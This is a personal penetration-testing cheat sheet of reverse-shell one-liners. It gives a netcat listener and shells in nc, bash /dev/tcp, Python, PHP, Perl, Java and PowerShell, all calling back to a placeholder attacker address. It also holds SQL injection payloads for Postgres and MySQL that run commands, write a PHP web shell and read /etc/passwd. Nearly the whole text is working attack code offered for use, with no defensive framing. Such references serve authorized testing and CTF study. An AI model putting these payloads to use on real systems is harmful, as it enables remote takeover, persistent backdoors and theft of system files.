# nc

Author: Julien Bongars
Date: 2025-09-20 16:34:33

---

# source

```bash
nc -lvp 4444
<wait for connection>
```

# target

```bash
# nc
nc -e /bin/bash YOUR_IP 4444

# nc with pipe
mknod /tmp/pipez p;/bin/sh 0</tmp/pipez|nc <YOUR_IP> 4444 1>/tmp/pipez;rm -rf /tmp/pipez 

# python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR_IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# bash (linux)
bash -i >& /dev/tcp/YOUR_IP/4444 0>&1
bash -i >& /dev/tcp/127.0.0.1/4444 0>&1

# php
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'

# perl
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

# base64 (any)

```bash
cat <<EOF | base64 -w 0 && echo ''
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR_IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
EOF
```

## Postgres

```sql
'; COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/YOUR_IP/4444 0>&1"'; --
```

### Alternatives

```sql
'; CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT; --

'; SELECT system('bash -c "bash -i >& /dev/tcp/YOUR_IP/4444 0>&1"'); --
```

## MySQl

```sql
'; SELECT "<?php system($_GET['c']); ?>" INTO OUTFILE '/var/www/html/shell.php'; --

'; SELECT load_file('/etc/passwd'); --
```

## Java

```java
# java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

## Powershell

```ps1
$LHOST = "10.10.10.10"; $LPORT = 9001; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()
```

# resource

## Generator\*\*\*

https://www.revshells.com/

### Github

https://github.com/0dayCTF/reverse-shell-generator

## Internet all the things

~/.hacklas/external/internal-all-the-things/docs/cheatsheets/shell-reverse-cheatsheet.md

https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#summary
